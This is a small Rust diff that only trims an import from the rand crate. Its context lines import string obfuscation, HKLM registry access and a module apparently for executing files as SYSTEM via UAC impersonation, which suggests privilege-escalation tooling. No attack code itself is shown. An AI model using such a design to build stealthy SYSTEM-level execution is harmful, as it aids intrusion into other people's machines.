@@ -8,7 +8,7 @@ use std::{
 use sysinfo::{ System, RefreshKind, CpuRefreshKind };
 use anyhow::{ Context, Result };
 use obfstr::obfstr as s;
-use rand::{ distributions::Alphanumeric, Rng };
+use rand::Rng;
 use winreg::{ enums::HKEY_LOCAL_MACHINE, RegKey };
 use crate::uac::impersonate_system::execute_file_as_system;
 
